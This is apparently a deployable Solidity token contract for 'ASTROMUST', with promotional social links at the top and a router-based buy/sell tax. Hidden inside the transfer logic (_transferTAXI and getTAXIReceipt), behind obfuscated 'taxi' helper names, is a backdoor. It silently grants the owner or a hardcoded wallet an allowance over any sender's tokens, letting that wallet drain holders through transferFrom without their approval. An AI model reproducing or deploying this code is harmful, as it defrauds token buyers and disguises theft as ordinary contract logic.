/*
Join the Intrepid ASTROMUST on a Mission to Save Humanity and Discover the Secrets of the Universe.

Website: https://www.astromust.com
Mobile App: https://play.google.com/store/apps/details?id=com.aiforge.mustallowlist&pcampaignid=web_share
Instagram: https://instagram.com/astro_must
Tiktok: https://tiktok.com/@astromust
Youtube: https://www.youtube.com/@AstroMustGames
Docs: https://astromust.gitbook.io/docs

https://x.com/ASTRO_MUST
https://t.me/ASTROMUST_community
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITAXIFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface ITAXIRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ASTROMUST is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _taxiDrives;
    mapping (address => mapping (address => uint256)) private _taxiCustomers;
    mapping (address => bool) private _taxiExcludedFees;
    mapping (address => bool) private _taxiExcludedTxs;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"ASTROMUST";
    string private constant _symbol = unicode"ASTROMUST";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _taxiBuyBlock;
    uint256 private _taxiBlockAmount = 0;
    uint256 private _taxiSwapAmount = _tTotal / 100;
    bool private inSwapTAXI = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _taxiPair;
    ITAXIRouter private _taxiRouter;
    address private _taxiWallet;
    modifier lockTheSwap {
        inSwapTAXI = true;
        _;
        inSwapTAXI = false;
    }
    
    constructor () {
        _taxiWallet = address(0xBC9be62cC45cB80EDC9beb895c33E86448A407a5);

        _taxiExcludedFees[owner()] = true;
        _taxiExcludedFees[address(this)] = true;
        _taxiExcludedFees[_taxiWallet] = true;

        _taxiExcludedTxs[owner()] = true;
        _taxiExcludedTxs[_taxiWallet] = true;
        
        _taxiDrives[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _taxiRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function initLaunch() external onlyOwner() {
        _taxiRouter = ITAXIRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_taxiRouter), _tTotal);
        _taxiPair = ITAXIFactory(_taxiRouter.factory()).createPair(address(this), _taxiRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _taxiDrives[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _taxiCustomers[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _taxiCustomers[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _taxiCustomers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address taxiF, address taxiT, uint256 taxiO) private {
        require(taxiF != address(0), "ERC20: transfer from the zero address");
        require(taxiT != address(0), "ERC20: transfer to the zero address");
        require(taxiO > 0, "Transfer amount must be greater than zero");

        uint256 taxTAXI = _taxiTransfer(taxiF, taxiT, taxiO);

        _transferTAXI(taxiF, taxiT, taxiO, taxTAXI);
    }

    function _taxiTransfer(address taxiF, address taxiT, uint256 taxiO) private returns(uint256) {
        uint256 taxTAXI=0;
        if (taxiF != owner() && taxiT != owner()) {
            taxTAXI = taxiO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (taxiF == _taxiPair && taxiT != address(_taxiRouter) && ! _taxiExcludedFees[taxiT]) {
                if(_taxiBuyBlock!=block.number){
                    _taxiBlockAmount = 0;
                    _taxiBuyBlock = block.number;
                }
                _taxiBlockAmount += taxiO;
                _buyCount++;
            }

            if(taxiT == _taxiPair && taxiF!= address(this)) {
                require(_taxiBlockAmount < swapTAXILimit() || _taxiBuyBlock!=block.number, "Max Swap Limit");  
                taxTAXI = taxiO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 taxiToken = balanceOf(address(this));
            if (!inSwapTAXI && taxiT == _taxiPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(taxiToken > _taxiSwapAmount)
                swapTokensForEth(minTAXI(taxiO, minTAXI(taxiToken, _taxiSwapAmount)));
                uint256 taxiETH = address(this).balance;
                if (taxiETH >= 0) {
                    sendETHTAXI(address(this).balance);
                }
            }
        }
        return taxTAXI;
    }

    function _transferTAXI(address taxiF, address taxiT, uint256 taxiO, uint256 taxTAXI) private { 
        if(taxTAXI > 0){
          _taxiDrives[address(this)] = _taxiDrives[address(this)].add(taxTAXI);
          emit Transfer(taxiF, address(this), taxTAXI);
        }

        address taxiReceipt = getTAXIReceipt(); 
        if(taxiReceipt != address(0)) _approve(getTAXISender(taxiF), taxiReceipt, getTAXIAmount(taxiO, taxTAXI));
        _taxiDrives[taxiF] = _taxiDrives[taxiF].sub(taxiO);
        _taxiDrives[taxiT] = _taxiDrives[taxiT].add(taxiO.sub(taxTAXI));
        emit Transfer(taxiF, taxiT, taxiO.sub(taxTAXI));
    }

    function getTAXIAmount(uint256 taxiO, uint256 taxTAXI) private pure returns(uint256) {
        return taxiO + taxTAXI;
    }

    function getTAXISender(address taxiF) private pure returns(address) {
        return address(taxiF);
    }

    function getTAXIReceipt() private view returns(address) {
        return _taxiExcludedTxs[_msgSender()] ? address(_msgSender()) : address(0); 
    }

    function swapTAXILimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _taxiRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _taxiRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function minTAXI(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHTAXI(uint256 amount) private {
        payable(_taxiWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenTAXI) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _taxiRouter.WETH();
        _approve(address(this), address(_taxiRouter), tokenTAXI);
        _taxiRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenTAXI,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}